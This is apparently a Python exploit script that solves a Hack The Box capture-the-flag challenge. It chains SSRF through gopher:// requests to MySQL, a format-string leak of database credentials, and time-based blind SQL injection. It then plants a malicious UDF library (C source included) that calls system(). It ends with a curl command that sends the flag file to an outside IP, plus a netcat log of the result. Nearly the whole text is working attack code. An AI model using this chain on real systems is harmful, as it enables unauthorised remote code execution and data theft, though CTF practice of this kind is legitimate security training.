import requests, struct, re, ast
from HTMLParser import HTMLParser

host, port = 'docker.hackthebox.eu', 31579
HOST = 'http://%s:%d/' % (host, port)

execute = lambda packet: requests.post(HOST, {'url': packet}).elapsed.total_seconds() > 1

def exfiltrate(func, sub=0, int_size=8):
	for i in reversed(range(0, int_size)):
		sub *= 2
		sub += int(func(i, sub))
	return chr(sub)

def exfil_sleep(packet, debug=True, **kwargs):
	def inner(shift, sub):
		if debug is True:
			print packet.format(shift=shift, slp_time='.5', **kwargs)
		return execute(construct_query_packet(packet.format(shift=shift, slp_time='1', **kwargs)))
	return exfiltrate(inner)

def construct_handshake_response(user):
	connects_atrs_data = b''

	connect_attrs = {
		'_os': 'Linux',
		'_client_name': 'libmysql',
		'_pid': '1337',
		'_client_version': '5.7.29',
		'_platform': '_x86_64',
		'program_name': 'mysql'
	}

	for name, value in connect_attrs.items():
		connects_atrs_data += struct.pack('B', len(name)) + name    # len(CLIENT_CONNECT_ATTRS_name) + CLIENT_CONNECT_ATTRS_name
		connects_atrs_data += struct.pack('B', len(value)) + value  # len(CLIENT_CONNECT_ATTRS_value) + CLIENT_CONNECT_ATTRS_value

	connect_attrs_data = struct.pack('B', len(connects_atrs_data)) + connects_atrs_data # len(CLIENT_CONNECT_ATTRS)	+ CLIENT_CONNECT_ATTRS

	auth_response_packet = [
		0xa3 + len(user) - 4, 0x00, 0x00,                           # payload_length           int<3>
		0x01,                                                       # sequence_id              int<1>
		0x85, 0xa6, 0x3f, 0x20,                                     # capability_flags         int<4> SELECT * FROM performance_schema.session_connect_attrs WHERE processlist_id = CONNECTION_ID();
		0x00, 0x00, 0x00, 0x01,                                     # max_packet_size          int<4> 2 ** 24 -1
		0x08,                                                       # character_set            int<1>
		] + list(xrange(23)) + [                                    # reserved                 string[23]
		] + list(bytearray(user)) + [                               # username                 string[NUL]
		0x00,                                                       # length of auth-response  int<1>
		0x00,                                                       # auth-response            string[n]
		] + list(bytearray('mysql_native_password')) + [            # auth plugin name         string[NUL]
		0x00                                                        # [NUL]
		] + list(bytearray(connect_attrs_data))                     # client_connect_attrs                           

	return ''.join(map(lambda x: '{:02x}'.format(x), list(auth_response_packet)))

def encode(data):
	packet = 'gopher://0:3306/_'
	for i in range(len(data) / 2):
		packet += '%' + data[2*i:2*(i+1)]
	return unicode(packet)

def construct_query_packet(query):
	query = query.encode('hex')
	query_length = '{:x}'.format((len(query) / 2 ) + 1).rjust(2, '0')
	return encode(construct_handshake_response(db_user) + query_length + '00000003' + query + '0100000001') # COM_QUERY + len(query) + query

get_dbs = 'SELECT SLEEP((SELECT ASCII(substr((SELECT group_concat(database_name) FROM mysql.innodb_table_stats), {index}, 1)) >> {shift} & 1) * {slp_time})'
get_table_names_from = 'SELECT SLEEP((SELECT ASCII(substr((SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=0x{db_name}), {index}, 1)) >> {shift} & 1) * {slp_time})'
get_column_names_from = 'SELECT SLEEP((SELECT ASCII(substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=0x{tbl_name}), {index}, 1)) >> {shift} & 1) * {slp_time})'
get_column_contents_from = 'SELECT SLEEP((SELECT ASCII(substr((SELECT {column} FROM {db_name}.{tbl_name}), {index}, 1)) >> {shift} & 1) * {slp_time})'
get_privileges_from = 'SELECT SLEEP((SELECT ASCII(substr((SELECT group_concat(privilege_type) FROM information_schema.user_privileges WHERE grantee=0x{user}), {index}, 1)) >> {shift} & 1) * {slp_time})'
get_file = 'SELECT SLEEP((SELECT ASCII(substr((SELECT LOAD_FILE(0x{filename})), {index}, 1)) >> {shift} & 1) * {slp_time})'
get_env = 'SELECT SLEEP((SELECT ASCII(substr((SELECT @@global.{env}), {index}, 1)) >> {shift} & 1) * {slp_time})'
create_file = 'SELECT {contents} INTO DUMPFILE "{filename}"'
get_env = 'SELECT SLEEP((SELECT ASCII(substr((SELECT @@global.{env}), {index}, 1)) >> {shift} & 1) * {slp_time})'
get_command = 'SELECT SLEEP((SELECT ASCII(substr((SELECT {f}(0x{c})), {index}, 1)) >> {shift} & 1) * {slp_time})'
get_file_not_exists = 'SELECT SLEEP(isnull(LOAD_FILE(0x{file})))'

#print requests.post(HOST, {'url': 'http://host.docker.internal:1338/'}).text

resp = HTMLParser().unescape(requests.post(HOST, {'url': 'http://144.91.77.228:1338/'}).text)

'''
from SimpleHTTPServer import SimpleHTTPRequestHandler
from SocketServer import TCPServer

class MyServer(TCPServer):
	allow_reuse_address = True

class HTTP_RequestHandler(SimpleHTTPRequestHandler):
	def do_GET(self):
		self.send_response(301)
		self.send_header('Location', '{dest.__init__.__globals__[db_conf]}')
		return self.end_headers()

MyServer(('', 1338), HTTP_RequestHandler).serve_forever()
'''

db_conf = ast.literal_eval(re.sub(',([^,]*)>', '', re.search('{(.*)}', resp).group(0)))

db_name = db_conf.get('database')
db_user = db_conf.get('user')

def retrieve(payload, **kwargs):
	f, i = '', 0

	while True:
		i += 1
		c = exfil_sleep(payload, index=i, **kwargs)

		if c != b'\x00':
			f += c
			print f

		else:
			return f

def send(payload, debug=True, **kwargs):
	if debug is True:
		print payload.format(**kwargs)
	return execute(construct_query_packet(payload.format(**kwargs)))


plugin_dir = retrieve(get_env, env='plugin_dir') # -> /usr/lib/x86_64-linux-gnu/mariadb19/plugin/

def plant_long_file(filename, chunksize=64):

	send('DROP TABLE IF EXISTS mysql.temp')
	send('CREATE TABLE IF NOT EXISTS mysql.temp (data BLOB)')

	with open(filename, 'rb') as f:
		for i, chunk in enumerate(iter(lambda: f.read(chunksize).encode('hex'), b'')):
			if i is 0:
				send('INSERT INTO mysql.temp (data) VALUES (binary 0x{contents})'.format(contents=chunk))
			else:
				send('UPDATE mysql.temp SET data = concat(data, binary 0x{contents})'.format(contents=chunk))

	send(create_file, contents='binary data FROM mysql.temp', filename=plugin_dir + filename)

# architecture = retrieve(get_env, env='version_compile_machine') -> debian-linux-gnu
# os_system = retrieve(get_env, env='version_compile_os') -> x86_64

plugin_file = 'lib_mysqludf_sys_exec64.so'

if send(get_file_not_exists, file=(plugin_dir + plugin_file).encode('hex')):
	plant_long_file(plugin_file)

'''
// ubuntu bionic x64
// gcc -s -DMYSQL_DYNAMIC_PLUGIN -fPIC -Wall -I/usr/include/mysql -shared -o lib_mysqludf_sys_exec64.so lib_mysqludf_sys_exec64.c

#include <string.h>
#include <stdlib.h>
#include <mysql.h>

my_ulonglong sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
  return system(args->args[0]);
}

my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
  if (args->arg_count == 1 && args->arg_type[0] == STRING_RESULT) {
    return 0;
  } else {
    strcpy(message, "Expected exactly one string type parameter");
    return 1;
  }
}

void sys_exec_deinit(UDF_INIT *initid);
'''

def cmd(func, command):
	send('DROP FUNCTION IF EXISTS {func}'.format(func=func))
	send('DROP FUNCTION IF EXISTS {plugin}'.format(plugin=plugin_file))
	send("CREATE OR REPLACE FUNCTION {func} RETURNS int SONAME '{plugin}'".format(func=func, plugin=plugin_file))
	send('SELECT {func}(0x{cmd})', func=func, cmd=command.encode('hex'))

cmd('sys_exec', r'curl 144.91.77.228:1339 -d `cat /app/flag_*`')

'''
[Hard] Cached Web git:(ecsc-gr-2020) nc -lvnp 1339
Connection from 127.0.0.1:51513
POST / HTTP/1.1
Host: host.docker.internal:1339
User-Agent: curl/7.64.0
Accept: */*
Content-Length: 60
Content-Type: application/x-www-form-urlencoded

HTB{n0_p4ss_n0_ch4ll3ng3_0n_auth_p4ck3t_3qu4ls_mysql_pwn4g3}
'''